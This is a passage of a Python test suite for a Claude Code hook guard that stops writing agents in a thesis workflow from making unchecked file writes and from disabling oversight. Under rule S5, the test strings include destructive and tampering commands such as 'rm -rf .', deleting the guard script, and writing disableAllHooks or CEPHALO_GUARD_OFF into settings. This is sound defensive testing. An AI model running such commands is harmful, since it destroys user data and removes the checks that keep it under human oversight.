        d = payload('Task', {'prompt': 'Check ch_1.md against the sources.', 'subagent_type': 'source-verifier'})
        self.passes(g.evaluate(d, env(state=st, on='P1')))
        d = payload('Task', {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'})
        self.deny(g.evaluate(d, env(state=st, on='P1')), 'P1')

    def test_off_by_default(self):
        st = self.state()
        d = payload('Agent', {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'})
        self.passes(g.evaluate(d, env(state=st)))
        self.assertEqual(os.listdir(st), [])                        # and no state file without P1

    def test_state_unwritable_does_not_block(self):
        bad = os.path.join(tempfile.mkdtemp(prefix='guard-p1-'), 'file')
        Path(bad).write_text('x', encoding='utf-8')            # a file where the folder should be
        out = self.agent('Prüfe nur Satz 2.', bad)
        hso = out['hookSpecificOutput']
        self.assertNotIn('permissionDecision', hso)
        self.assertIn('sent, but check it', hso['additionalContext'])


# ------------------------------------------------------------------ robustness, end to end


def run_script(stdin_bytes, extra_env=None, python=sys.executable):
    e = dict(os.environ)
    e.update(extra_env or {})
    p = subprocess.run([python, '-I', '-S', str(GUARD)], input=stdin_bytes, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, env=e, timeout=20)
    out = p.stdout.decode('ascii')
    if out.strip():
        check_shape(json.loads(out))     # what the hook prints, not only what evaluate() returns
    return p.returncode, out, p.stderr.decode('utf-8', 'replace')


class TestRobustness(Base):
    def test_bad_input_fails_open_with_note(self):
        for raw in (b'', b'not json', b'[1, 2]', b'{"tool_name": "Bash"}', b'\xff\xfe\x00garbage',
                    json.dumps({'hook_event_name': 'PreToolUse', 'tool_name': 'Bash', 'tool_input': 'x'}).encode(),
                    json.dumps({'hook_event_name': 'PreToolUse', 'tool_name': 'Bash', 'tool_input': {}}).encode()):
            with self.subTest(raw=raw[:40]):
                code, out, err = run_script(raw, {'CEPHALO_GUARD_STATE_DIR': tempfile.mkdtemp(prefix='note-')})
                self.assertEqual(code, 0)
                data = json.loads(out)
                self.assertEqual(list(data), ['systemMessage'])
                self.assertIn('nothing was checked', data['systemMessage'])
                self.assertEqual(out.count('\n'), 0)

    def test_note_once_per_session(self):
        st = tempfile.mkdtemp(prefix='note-')
        raw = json.dumps({'session_id': 's-note', 'hook_event_name': 'PreToolUse', 'tool_name': 'Bash',
                          'tool_input': {}}).encode()
        self.assertIn('nothing was checked', run_script(raw, {'CEPHALO_GUARD_STATE_DIR': st})[1])
        self.assertEqual(run_script(raw, {'CEPHALO_GUARD_STATE_DIR': st})[:2], (0, ''))
        other = raw.replace(b's-note', b's-other')
        self.assertIn('nothing was checked', run_script(other, {'CEPHALO_GUARD_STATE_DIR': st})[1])

    def test_ignored_events_and_tools(self):
        for d in (payload('Read', {'file_path': '/tmp/x'}), payload('Grep', {'pattern': 'x'}),
                  dict(payload('Bash', {'command': 'echo x > y.md'}), hook_event_name='SessionStart'),
                  payload('Bash', {'command': 'echo x > y.md'}, event='PostToolUse')):
            with self.subTest(tool=d['tool_name'], event=d['hook_event_name']):
                code, out, _ = run_script(json.dumps(d).encode())
                self.assertEqual((code, out), (0, ''))

    def test_bom_and_umlauts(self):
        d = payload('Bash', {'command': 'echo "Ä" >> "Kapitel ü.md"'}, cwd='/home/u/Projekt Übung')
        e = {'CLAUDE_PROJECT_DIR': '/home/u/Projekt Übung', 'CEPHALO_GUARD_OS': 'posix', 'HOME': '/home/u'}
        code, out, _ = run_script(b'\xef\xbb\xbf' + json.dumps(d, ensure_ascii=False).encode('utf-8'), e)
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)['hookSpecificOutput']['permissionDecision'], 'deny')

    def test_internal_error_fails_open(self):
        orig = g.check_shell
        g.check_shell = lambda *a, **k: 1 / 0
        try:
            import io
            sys_stdin, sys_stdout = sys.stdin, sys.stdout
            sys.stdin = io.TextIOWrapper(io.BytesIO(json.dumps(payload('Bash', {'command': 'ls'},
                                                                       session='s-crash')).encode()))
            os.environ['CEPHALO_GUARD_STATE_DIR'] = tempfile.mkdtemp(prefix='note-')
            buf = io.StringIO()
            sys.stdout = buf
            try:
                self.assertEqual(g.main(), 0)
            finally:
                sys.stdin, sys.stdout = sys_stdin, sys_stdout
            self.assertIn('internal error (ZeroDivisionError', json.loads(buf.getvalue())['systemMessage'])
            check_shape(json.loads(buf.getvalue()))
        finally:
            g.check_shell = orig

    def test_end_to_end_each_rule(self):
        root = tempfile.mkdtemp(prefix='guard-e2e-')
        os.makedirs(os.path.join(root, 'workspace', 'output', 'verification'))
        rep = os.path.join(root, 'workspace', 'output', 'verification', 'ch_1_round_1.md')
        Path(rep).write_text('| 1 | a |\nStatus: ok\n', encoding='utf-8')
        fmt = os.path.join(root, 'workspace', 'output', 'verification', 'document_format_round_1.md')
        Path(fmt).write_text('x', encoding='utf-8')
        e = {'CLAUDE_PROJECT_DIR': root, 'CEPHALO_GUARD_OS': 'posix', 'HOME': '/home/u',
             'CEPHALO_GUARD_STATE_DIR': tempfile.mkdtemp(prefix='guard-e2e-state-'), 'CEPHALO_GUARD_ON': 'P1'}
        cases = [
            (payload('Bash', {'command': 'py -c "open(\'a.md\',\'w\').write(\'x\')"'}, cwd=root), 'deny', 'S1'),
            (payload('Bash', {'command': 'pandoc a.md -o /tmp/a.docx'}, cwd=root), 'deny', 'S2'),
            (payload('Bash', {'command': 'python3 scripts/a.py || py scripts/a.py'}, cwd=root), 'deny', 'S3'),
            (payload('PowerShell', {'command': 'py scripts/a.py > out.txt'}, cwd=root), 'deny', 'S4'),
            (payload('Edit', {'file_path': fmt, 'old_string': 'x', 'new_string': 'y'}, cwd=root), 'deny', 'R6'),
            (payload('Agent', {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'}, cwd=root),
             'deny', 'P1'),
            (payload('Agent', {'prompt': 'Verifiziere ch_1.md.', 'subagent_type': 'source-verifier'}, cwd=root),
             'pass', ''),
            (payload('Edit', {'file_path': rep, 'old_string': 'a', 'new_string': 'b'}, cwd=root), 'deny', 'R5'),
            (payload('Write', {'file_path': os.path.join(root, '.claude', 'settings.local.json'),
                               'content': '{"disableAllHooks": true}'}, cwd=root), 'deny', 'S5'),
            (payload('Write', {'file_path': rep, 'content': 'x'}, event='PostToolUse', cwd=root), 'block', 'R5'),
            (payload('Bash', {'command': 'py scripts/verbatim_check.py ch.md workspace/sources/ > '
                                         'workspace/output/verification/ch_1_round_1_verbatim.txt 2>&1'},
                     cwd=root), 'pass', ''),
        ]
        for d, want, rule in cases:
            with self.subTest(tool=d['tool_name'], want=want, rule=rule):
                code, out, err = run_script(json.dumps(d).encode(), e)
                self.assertEqual(code, 0, err)
                if want == 'pass':
                    self.assertEqual(out, '')
                    continue
                data = json.loads(out)
                self.assertNotIn('"allow"', out)
                if want == 'deny':
                    self.assertEqual(data['hookSpecificOutput']['permissionDecision'], 'deny')
                    self.assertIn('cephalo guard %s' % rule, data['hookSpecificOutput']['permissionDecisionReason'])
                elif want == 'context':
                    self.assertIn('cephalo guard %s' % rule, data['hookSpecificOutput']['additionalContext'])
                else:
                    self.assertEqual(data['decision'], 'block')
                    self.assertIn('cephalo guard %s' % rule, data['reason'])
        shutil.rmtree(root)

    def test_p1_resend_across_processes(self):
        e = {'CLAUDE_PROJECT_DIR': POSIX_ROOT, 'CEPHALO_GUARD_OS': 'posix', 'HOME': POSIX_HOME,
             'CEPHALO_GUARD_STATE_DIR': tempfile.mkdtemp(prefix='guard-e2e-state-'), 'CEPHALO_GUARD_ON': 'P1'}
        raw = json.dumps(payload('Agent', {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'},
                                 session='live-like')).encode()
        first = run_script(raw, e)[1]
        second = run_script(raw, e)
        self.assertIn('"deny"', first)
        self.assertEqual(second[:2], (0, ''))

    def test_never_allow(self):
        import re
        code = re.sub(r'"""[\s\S]*?"""', '', GUARD.read_text(encoding='utf-8'))   # without docstrings
        self.assertNotRegex(code, r'[\'"](?:allow|ask|defer|approve|updatedInput|continue|stopReason|'
                                  r'suppressOutput)[\'"]')
        self.assertNotRegex(code, r'exit\(\s*[12]\s*\)')
        for bad in ({'hookSpecificOutput': {'hookEventName': 'PreToolUse', 'permissionDecision': 'allow',
                                            'permissionDecisionReason': 'x'}},
                    {'hookSpecificOutput': {'hookEventName': 'PreToolUse', 'permissionDecision': 'deny',
                                            'permissionDecisionReason': 'x', 'updatedInput': {'command': 'true'}}},
                    {'hookSpecificOutput': {'hookEventName': 'PreToolUse', 'additionalContext': 'x'},
                     'continue': False, 'stopReason': 'x'},
                    {'decision': 'approve', 'reason': 'x'}, {'systemMessage': 'x', 'suppressOutput': True}):
            with self.subTest(bad=bad):
                self.assertRaises(AssertionError, check_shape, bad)


class TestSettingsCommand(Base):
    """Runs the command string of templates/claude_settings.json the way
    Claude Code runs a shell-form hook on macOS and Linux (sh -c), with the
    interpreter this test runs on first on PATH."""

    def setUp(self):
        self.settings = json.loads(SETTINGS.read_text(encoding='utf-8'))
        self.cmd = self.settings['hooks']['PreToolUse'][0]['hooks'][0]['command']
        self.top = tempfile.mkdtemp(prefix='guard-settings-')
        self.bin = os.path.join(self.top, 'bin')
        os.makedirs(self.bin)
        os.symlink(sys.executable, os.path.join(self.bin, 'python3'))
        self.sample = json.dumps(payload('Bash', {'command': 'echo "| x |" >> workspace/state.md'},
                                         cwd=self.top)).encode()

    def tearDown(self):
        shutil.rmtree(self.top)

    def sh(self, project, path=None, extra=None, cwd=None):
        e = {'PATH': path if path is not None else self.bin + ':/usr/bin:/bin', 'HOME': '/home/u'}
        if project is not None:
            e['CLAUDE_PROJECT_DIR'] = project
        e.update(extra or {})
        p = subprocess.run(['/bin/sh', '-c', self.cmd], input=self.sample, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, env=e, timeout=20, cwd=cwd or self.top)
        out = p.stdout.decode('ascii')
        if out.strip():
            check_shape(json.loads(out))     # what Claude Code receives: the hook command's output
        return p.returncode, out

    def project(self, name, with_script=True):
        d = os.path.join(self.top, name)
        os.makedirs(os.path.join(d, 'scripts'))
        if with_script:
            shutil.copy(str(GUARD), os.path.join(d, 'scripts', 'cephalo_guard.py'))
            shutil.copy(str(WRAPPER), os.path.join(d, 'scripts', 'cephalo_guard.sh'))
        return d

    def test_matchers_and_shape(self):
        pre = self.settings['hooks']['PreToolUse'][0]
        self.assertEqual(set(pre['matcher'].split('|')), {'Bash', 'PowerShell', 'Write', 'Edit', 'MultiEdit',
                                                          'NotebookEdit', 'Agent', 'Task', 'SendMessage'})
        self.assertEqual(self.settings['hooks']['PostToolUse'][0]['matcher'], 'Write')
        self.assertEqual(self.settings['hooks']['PostToolUse'][0]['hooks'][0]['command'], self.cmd)
        self.assertEqual(sorted(self.settings['hooks']), ['PostToolUse', 'PreToolUse'])
        for event in ('PreToolUse', 'PostToolUse'):
            self.assertEqual(len(self.settings['hooks'][event]), 1)
            hooks = self.settings['hooks'][event][0]['hooks']
            self.assertEqual(len(hooks), 1)
            # onFailure "continue": a hook that cannot run (no Git Bash on Windows) never blocks a call
            self.assertEqual(hooks[0], {'type': 'command', 'command': self.cmd, 'timeout': 10,
                                        'onFailure': 'continue'})
        raw = SETTINGS.read_bytes()
        self.assertFalse(raw.startswith(b'\xef\xbb\xbf'))
        self.assertNotIn(b'\r', raw)

    def test_wrapper_without_guard_or_wrapper(self):
        d = self.project('wrapperonly', with_script=False)
        shutil.copy(str(WRAPPER), os.path.join(d, 'scripts', 'cephalo_guard.sh'))
        self.assertEqual(self.sh(d), (0, ''))                         # the wrapper without the guard

    def test_macos_stub_is_skipped(self):
        fake = os.path.join(self.top, 'macbin')
        os.makedirs(fake)
        log = os.path.join(self.top, 'stub.log')
        for name, body in (('uname', 'echo Darwin'), ('xcode-select', 'exit 2'),
                           ('python3', 'echo called > "%s"; exit 0' % log)):
            Path(fake, name).write_text('#!/bin/sh\n%s\n' % body, encoding='ascii')
            os.chmod(os.path.join(fake, name), 0o755)
        d = self.project('mac')
        # the wrapper only skips /usr/bin/python3: run it with a command -v that reports that path
        # (from scripts/, beside the guard, as the hook command does)
        wrapped = os.path.join(d, 'scripts', 'wrap.sh')
        body = WRAPPER.read_text(encoding='ascii')
        Path(wrapped).write_text('command() { if [ "$1" = -v ] && [ "$2" = python3 ]; then echo /usr/bin/python3; '
                                 'else builtin command "$@"; fi; }\n' + body, encoding='ascii')
        p = subprocess.run(['/bin/bash', wrapped], input=self.sample, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, env={'PATH': fake + ':/usr/bin:/bin', 'HOME': '/home/u'},
                           timeout=20)
        self.assertEqual((p.returncode, p.stdout), (0, b''))
        self.assertFalse(os.path.exists(log))
        Path(fake, 'xcode-select').write_text('#!/bin/sh\nexit 0\n', encoding='ascii')   # tools installed
        p = subprocess.run(['/bin/bash', wrapped], input=self.sample, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, env={'PATH': fake + ':/usr/bin:/bin', 'HOME': '/home/u'},
                           timeout=20)
        self.assertEqual(p.returncode, 0)
        self.assertTrue(os.path.exists(log))

    def test_runs_guard(self):
        code, out = self.sh(self.project('flat'))
        self.assertEqual(code, 0)
        self.assertIn('cephalo guard S1', json.loads(out)['hookSpecificOutput']['permissionDecisionReason'])

    def test_sub_project_uses_parent_scripts(self):
        top = self.project('multi')
        os.makedirs(os.path.join(top, '00_Shared_Materials'))
        sub = os.path.join(top, '02_Main_Work')
        os.makedirs(sub)
        code, out = self.sh(sub)
        self.assertEqual(code, 0)
        self.assertIn('deny', out)

    def test_other_projects_never_use_the_folder_above(self):
        # a project without its own scripts (deleted, or a folder in Downloads) runs no script of the
        # folder above it, which may be anyone's: only a multi-project sub-project does
        top = self.project('outer')
        inner = os.path.join(top, 'thesis')
        os.makedirs(inner)
        self.assertEqual(self.sh(inner), (0, ''))

    def test_missing_script_or_python_passes_silently(self):
        self.assertEqual(self.sh(self.project('noscript', with_script=False)), (0, ''))
        # no Python, but sh is there: the wrapper itself runs and stays silent
        onlysh = os.path.join(self.top, 'onlysh')
        os.makedirs(onlysh)
        os.symlink('/bin/sh', os.path.join(onlysh, 'sh'))
        self.assertEqual(self.sh(self.project('nopython'), path=onlysh), (0, ''))
        self.assertEqual(self.sh(None), (0, ''))                     # no variable, no scripts/ in cwd
        # no variable: nothing runs, also not a scripts/ folder the current folder happens to have
        self.assertEqual(self.sh(None, cwd=self.project('cwdonly')), (0, ''))
        self.assertEqual(self.sh('', cwd=self.project('cwdempty')), (0, ''))

    def test_off_all_starts_no_python(self):
        fake = os.path.join(self.top, 'logbin')
        os.makedirs(fake)
        log = os.path.join(self.top, 'started.log')
        Path(fake, 'python3').write_text('#!/bin/sh\necho started >> "%s"\nexec "%s" "$@"\n' % (log, sys.executable),
                                         encoding='ascii')
        os.chmod(os.path.join(fake, 'python3'), 0o755)
        d = self.project('offall')
        for value in ('all', 'ALL'):
            self.assertEqual(self.sh(d, path=fake + ':/usr/bin:/bin', extra={'CEPHALO_GUARD_OFF': value}), (0, ''))
        self.assertFalse(os.path.exists(log))
        code, out = self.sh(d, path=fake + ':/usr/bin:/bin', extra={'CEPHALO_GUARD_OFF': 'S2'})
        self.assertIn('cephalo guard S1', out)                       # a list of rules: Python reads it
        self.assertTrue(os.path.exists(log))

    def test_crashing_interpreter_passes(self):
        fake = os.path.join(self.top, 'badbin')
        os.makedirs(fake)
        Path(fake, 'python3').write_text('#!/bin/sh\nexit 2\n', encoding='ascii')
        os.chmod(os.path.join(fake, 'python3'), 0o755)
        self.assertEqual(self.sh(self.project('crash'), path=fake + ':/usr/bin:/bin'), (0, ''))

    def test_windows_branch_prefers_py(self):
        fake = os.path.join(self.top, 'winbin')
        os.makedirs(fake)
        log = os.path.join(self.top, 'py.log')
        Path(fake, 'py').write_text('#!/bin/sh\necho "$@" > "%s"\nshift\nexec "%s" "$@"\n' % (log, sys.executable),
                                    encoding='ascii')
        os.chmod(os.path.join(fake, 'py'), 0o755)
        code, out = self.sh(self.project('win'), path=fake + ':/usr/bin:/bin', extra={'OS': 'Windows_NT'})
        self.assertEqual(code, 0)
        self.assertIn('deny', out)
        self.assertTrue(Path(log).read_text(encoding='ascii').startswith('-3 -I -S '))


# ------------------------------------------------------------------ switches, S5, R5 Edit, scripts


class TestSwitches(Base):
    SLIP = 'echo "| a |" >> workspace/state.md'

    def test_off_all(self):
        self.passes(bash(self.SLIP, off='all'))
        self.passes(bash(self.SLIP, off='ALL'))
        self.passes(run('Write', {'file_path': '/tmp/x.md', 'content': 'x'}, off='all'))
        self.passes(run('Agent', {'prompt': 'Prüfe nur Satz 2.'}, on='P1', off='all'))

    def test_off_some(self):
        self.passes(bash(self.SLIP, off='S1'))
        self.passes(bash(self.SLIP, off='s2, s1'))
        out = bash('echo x > /tmp/x.md', off='S1')
        self.deny(out, 'S2')
        self.assertNotIn('guard S1', out['hookSpecificOutput']['permissionDecisionReason'])
        self.deny(bash(self.SLIP, off='S2'), 'S1')

    def test_p1_needs_on(self):
        prompt = {'prompt': 'Prüfe nur Satz 2.', 'subagent_type': 'source-verifier'}
        self.passes(run('Agent', prompt))
        self.deny(run('Agent', prompt, on='P1', state=tempfile.mkdtemp(prefix='p1-on-')), 'P1')
        self.passes(run('Agent', prompt, on='P1', off='P1'))


class TestS5Protected(Base):
    def test_file_tools(self):
        for path in ('/home/u/proj/.claude/settings.json', '/home/u/proj/.claude/settings.local.json',
                     '/home/u/.claude/settings.json', '/home/u/proj/scripts/cephalo_guard.py',
                     '/home/u/proj/scripts/new_helper.py', 'scripts/cephalo_guard.sh'):
            for tool, tin in (('Write', {'file_path': path, 'content': '{}'}),
                              ('Edit', {'file_path': path, 'old_string': 'a', 'new_string': 'b'})):
                with self.subTest(tool=tool, path=path):
                    self.deny(run(tool, tin), 'S5')
        out = run('Write', {'file_path': '/home/u/proj/.claude/settings.local.json',
                            'content': '{"env": {"CEPHALO_GUARD_OFF": "all"}}'}, agent='writer-agent')
        self.deny(out, 'S5')
        reason = out['hookSpecificOutput']['permissionDecisionReason']
        for part in ('not done', 'only by the user', 'tell the user', 'docs/scripts.md'):
            self.assertIn(part, reason)
        self.deny(run('Write', {'file_path': 'C:\\Home\\u\\Projekt Arbeit\\.claude\\settings.local.json',
                                'content': '{}'}, plat='windows'), 'S5')
        self.passes(run('Write', {'file_path': '/home/u/proj/.claude/agents/notes.md', 'content': 'x'}))
        self.passes(run('Write', {'file_path': '/home/u/proj/workspace/data/scripts/fit.py', 'content': 'x'}))

    def test_shell(self):
        for cmd in ('rm scripts/cephalo_guard.py', 'rm -rf scripts', 'rm -rf .claude', 'rm -rf .',
                    'mv scripts/cephalo_guard.py _scratch/', 'mv -t _scratch scripts/cephalo_guard.sh',
                    "echo '{}' > .claude/settings.local.json", 'cp _scratch/fix.py scripts/',
                    'cp _scratch/settings.json .claude/settings.json', 'touch scripts/x.py',
                    "sed -i 's/a/b/' scripts/cephalo_guard.py", 'truncate -s 0 scripts/cephalo_guard.py',
                    'find scripts -name "*.py" -delete', 'unlink .claude/settings.json',
                    'py -c "import os; os.remove(\'scripts/cephalo_guard.py\')"',
                    'python3 -c "import shutil; shutil.rmtree(\'.claude\')"',
                    'cd workspace && rm ../scripts/cephalo_guard.py', 'rm ~/.claude/settings.json'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(bash(cmd)), cmd)

    def test_powershell(self):
        for cmd in ('Remove-Item .claude\\settings.local.json', 'Remove-Item -Path scripts -Recurse -Force',
                    "Set-Content -Path .claude/settings.json -Value '{}'", 'Move-Item scripts\\cephalo_guard.py x.py',
                    'Rename-Item -Path scripts\\cephalo_guard.sh -NewName x.sh', 'del scripts\\cephalo_guard.py',
                    'Copy-Item x.json -Destination .claude\\settings.local.json'):
            with self.subTest(cmd=cmd):
                self.assertIn('S5', rules_of(ps(cmd)), cmd)

    def test_reading_and_other_files_pass(self):
        for cmd in ('cat .claude/settings.json', 'ls scripts', 'cp scripts/verbatim_check.py _scratch/orchestrator/',
                    'git status --short scripts', 'rm -rf _scratch/orchestrator', 'mv a.md b.md',
                    'grep -n cephalo_guard .claude/settings.json', 'bash scripts/docx_postprocess.sh out.docx',
                    'py -c "import json; print(json.load(open(\'.claude/settings.json\')))"'):
            with self.subTest(cmd=cmd):
                self.passes(bash(cmd))
        for cmd in ('Get-Content .claude\\settings.json', 'Move-Item a.md _scratch\\a.md',
                    'Remove-Item -Recurse _scratch\\orchestrator'):
            with self.subTest(cmd=cmd):
                self.passes(ps(cmd))

    def test_windows_paths(self):
        self.assertIn('S5', rules_of(bash('rm "C:\\Home\\u\\Projekt Arbeit\\scripts\\cephalo_guard.py"',
                                          plat='windows')))
        self.assertIn('S5', rules_of(bash('rm "/c/Home/u/Projekt Arbeit/.CLAUDE/Settings.Local.json"',
                                          plat='windows')))

    def test_multi_project_root_scripts(self):
        top = tempfile.mkdtemp(prefix='guard-multi5-')
        os.makedirs(os.path.join(top, '00_Shared_Materials'))
        sub = os.path.join(top, '01_Proposal')
        os.makedirs(sub)
        self.assertIn('S5', rules_of(bash('rm ../scripts/cephalo_guard.py', root=sub, cwd=sub)))
        self.deny(run('Write', {'file_path': os.path.join(sub, '.claude', 'settings.json'), 'content': '{}'},
                      root=sub, cwd=sub), 'S5')
        self.passes(bash('cp ../00_Shared_Materials/styleguide.md _scratch/orchestrator/', root=sub, cwd=sub))
        shutil.rmtree(top)

    def test_macos_unicode_form(self):
        nfd, nfc = (unicodedata.normalize(f, '/Users/u/Masterarbeit Übung') for f in ('NFD', 'NFC'))
        for cmd in ('rm -rf "%s/scripts"' % nfc, 'rm "%s/scripts/cephalo_guard.py"' % nfc,
                    'mv "%s" ../alt' % nfc):
            with self.subTest(cmd=ascii(cmd)):
                self.assertIn('S5', rules_of(bash(cmd, plat='macos', root=nfd)))
        for path in (nfc + '/scripts/cephalo_guard.py', nfc + '/.claude/settings.json'):
            with self.subTest(path=ascii(path)):
                self.assertEqual(rules_of(run('Write', {'file_path': path, 'content': '{}'}, plat='macos', root=nfd)),
                                 {'S5'})
        # a sibling sub-project whose folder Finder named (NFD), removed by a typed (NFC) name
        top = tempfile.mkdtemp(prefix='guard-multi7-')
        sib = unicodedata.normalize('NFD', '02_Hauptarbeit Übung')
        for d in ('00_Shared_Materials', '01_Expose', sib + '/.claude'):
            os.makedirs(os.path.join(top, d))
        sub = os.path.join(top, '01_Expose')
        self.assertIn('S5', rules_of(bash('rm -rf "../%s"' % unicodedata.normalize('NFC', sib), plat='macos',
                                          root=sub, cwd=sub)))
        shutil.rmtree(top)


class TestR5Edit(Base):
    def test_coordinator_edit_denied(self):
        for name in ('ch_1_round_1.md', 'consistency_final.md', 'extracts_round_2.md'):
            p = '/home/u/proj/workspace/output/verification/' + name
            for tool in ('Edit', 'MultiEdit'):
                tin = {'file_path': p, 'old_string': '\u201c', 'new_string': '"', 'replace_all': True} \
                    if tool == 'Edit' else {'file_path': p, 'edits': [{'old_string': 'a', 'new_string': 'b'}]}
                with self.subTest(name=name, tool=tool):
                    out = run(tool, tin)
                    self.deny(out, 'R5')
                    reason = out['hookSpecificOutput']['permissionDecisionReason']
                    self.assertIn('write the file again with the Write tool', reason)
        out = run('Edit', {'file_path': '/home/u/proj/03_Theory_chapters/verification/ch_2_round_1.md',
                           'old_string': 'a', 'new_string': 'b'}, agent='orchestrator-longform')
        self.deny(out, 'R5')
        self.assertIn('orchestrator-longform.md', out['hookSpecificOutput']['permissionDecisionReason'])

    def test_others_pass(self):
        ver = '/home/u/proj/workspace/output/verification/'
        self.passes(run('Edit', {'file_path': ver + 'ch_1_round_1_verbatim.txt', 'old_string': 'a',
                                 'new_string': 'b'}))
        self.passes(run('Write', {'file_path': ver + 'ch_1_round_1.md', 'content': 'x'}))
        self.passes(run('Edit', {'file_path': ver + 'ch_1_round_1.md', 'old_string': 'a', 'new_string': 'b'},
                        off='R5'))
        self.passes(run('Edit', {'file_path': '/home/u/proj/workspace/state.md', 'old_string': 'a',
                                 'new_string': 'b'}))
        self.deny(run('Edit', {'file_path': ver + 'document_format_round_1.md', 'old_string': 'a',
                               'new_string': 'b'}), 'R6')

    def test_macos_unicode_form(self):
        root = tempfile.mkdtemp(prefix='guard-r5-')
        nfd = os.path.join(root, unicodedata.normalize('NFD', 'Masterarbeit Übung'))
        nfc = os.path.join(root, unicodedata.normalize('NFC', 'Masterarbeit Übung'))
        os.makedirs(os.path.join(nfd, 'workspace', 'output', 'verification'))
        rep = nfc + '/workspace/output/verification/ch_1_round_1.md'
        self.assertEqual(rules_of(run('Edit', {'file_path': rep, 'old_string': 'a', 'new_string': 'b'},
                                      plat='macos', root=nfd)), {'R5'})
        Path(nfd, 'workspace/output/verification/ch_1_round_1.md').write_text(
            '| a |\nQuelle: %s/workspace/sources/a.pdf\n' % nfc, encoding='utf-8')
        out = run('Write', {'file_path': nfd + '/workspace/output/verification/ch_1_round_1.md', 'content': 'x'},
                  event='PostToolUse', plat='macos', root=nfd)
        self.assertIn('R5: workspace/output/verification/ch_1_round_1.md is saved', out['reason'])
        self.assertIn('still contains an absolute path', out['reason'])
        # the other way round: the project folder typed (NFC), the path in the report as Finder wrote it (NFD)
        os.makedirs(os.path.join(nfc, 'workspace', 'output', 'verification'))
        Path(nfc, 'workspace/output/verification/ch_2_round_1.md').write_text(
            '| a |\nQuelle: %s/workspace/sources/a.pdf\n' % nfd, encoding='utf-8')
        out = run('Write', {'file_path': nfc + '/workspace/output/verification/ch_2_round_1.md', 'content': 'x'},
                  event='PostToolUse', plat='macos', root=nfc)
        self.assertIn('still contains an absolute path', out['reason'])
        shutil.rmtree(root)


class TestScripts(Base):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix='guard-scripts-')
        for d in ('scripts', '_scratch/orchestrator', 'workspace/data/scripts'):
            os.makedirs(os.path.join(self.root, d))

    def tearDown(self):
        shutil.rmtree(self.root)

    def put(self, rel, text):
        p = os.path.join(self.root, rel)
        Path(p).write_text(text, encoding='utf-8')
        os.chmod(p, 0o755)
        return p

    def b(self, cmd):
        return bash(cmd, root=self.root, cwd=self.root)

    def test_shipped_list_matches_folder(self):
        here = sorted(p.name for p in (ROOT / 'scripts').iterdir() if p.suffix in ('.py', '.sh'))
        self.assertEqual(sorted(g.SHIPPED_SCRIPTS), here)

    def test_saved_programs_are_read(self):
        write_py = "from pathlib import Path\nPath('workspace/state.md').write_text('x')\n"
        self.put('scripts/fix.py', write_py)                 # saved in scripts/, not cephalo's
        self.put('_scratch/orchestrator/fix.py', write_py)
        self.put('_scratch/orchestrator/fix.sh', "sed -i 's/a/b/' workspace/output/chapters/ch_1.md\n")
        self.put('_scratch/orchestrator/rm.sh', 'rm -f scripts/cephalo_guard.py\n')
        for cmd, rule in (('py scripts/fix.py', 'S1'), ('python3 _scratch/orchestrator/fix.py', 'S1'),
                          ('./_scratch/orchestrator/fix.py', 'S1'), ('bash _scratch/orchestrator/fix.sh', 'S1'),
                          ('sh -e _scratch/orchestrator/fix.sh', 'S1'), ('./_scratch/orchestrator/fix.sh', 'S1'),
                          ('bash _scratch/orchestrator/rm.sh', 'S5')):
            with self.subTest(cmd=cmd):
                self.assertIn(rule, rules_of(self.b(cmd)), cmd)

    def test_cephalo_and_analysis_scripts_pass(self):
        self.put('scripts/verbatim_check.py', "open('out.txt', 'w').write('x')\n")   # trusted by name
        self.put('scripts/docx_postprocess.sh', "sed -i 's/a/b/' x\n")
        self.put('workspace/data/scripts/fit.py', "import pandas\npandas.DataFrame().to_csv('out.csv')\n")
        self.put('_scratch/orchestrator/count.py', "print(open('workspace/state.md').read().count('|'))\n")
        for cmd in ('py scripts/verbatim_check.py ch.md workspace/sources/ > out.txt 2>&1',
                    'bash scripts/docx_postprocess.sh document.docx', './scripts/docx_postprocess.sh document.docx',
                    'py workspace/data/scripts/fit.py', 'python3 _scratch/orchestrator/count.py',
                    'bash _scratch/orchestrator/missing.sh'):
            with self.subTest(cmd=cmd):
                self.passes(self.b(cmd))


class TestMessagesPointToRules(Base):
    """Every file a message names exists, and a section or phrase it quotes
    after the file stands in that file."""
    REF = re.compile(r'((?:\.claude/agents|docs|checklists)/[\w.-]+)((?:(?:, |: |; |\()"[^"]+")*)')

    def check(self, text):
        refs = self.REF.findall(text)
        self.assertTrue(refs, text)
        for path, quoted in refs:
            body = (ROOT / path).read_text(encoding='utf-8')
            for q in re.findall(r'"([^"]+)"', quoted):
                self.assertIn(q, body, '%s does not hold "%s"' % (path, q))

    def test_all_messages(self):
        root = tempfile.mkdtemp(prefix='guard-msg-')
        ver = os.path.join(root, 'workspace', 'output', 'verification')
        os.makedirs(ver)
        fmt = os.path.join(ver, 'document_format_round_1.md')
        Path(fmt).write_text('x', encoding='utf-8')
        rep = os.path.join(ver, 'ch_1_round_1.md')
        Path(rep).write_text('| a |\nStatus: x\n', encoding='utf-8')
        agents = [None, 'orchestrator', 'orchestrator-longform', 'orchestrator-defense', 'research-agent',
                  'style-resolver', 'format-verifier', 'data-agent', 'methods-agent', 'writer-agent']
        for agent in agents:
            outs = [bash('py -c "open(\'a.md\', \'w\').write(\'x\')"', agent=agent, root=root, cwd=root),
                    bash('pandoc a.md -o /tmp/a.docx', agent=agent, root=root, cwd=root),
                    bash('python3 scripts/a.py || py scripts/a.py', agent=agent, root=root, cwd=root),
                    bash('python3 scripts/a.py', plat='windows', agent=agent),
                    ps('py scripts/a.py > out.txt', agent=agent),
                    bash('rm scripts/cephalo_guard.py', agent=agent, root=root, cwd=root),
                    run('Edit', {'file_path': fmt, 'old_string': 'a', 'new_string': 'b'}, agent=agent, root=root),
                    run('Edit', {'file_path': rep, 'old_string': 'a', 'new_string': 'b'}, agent=agent, root=root),
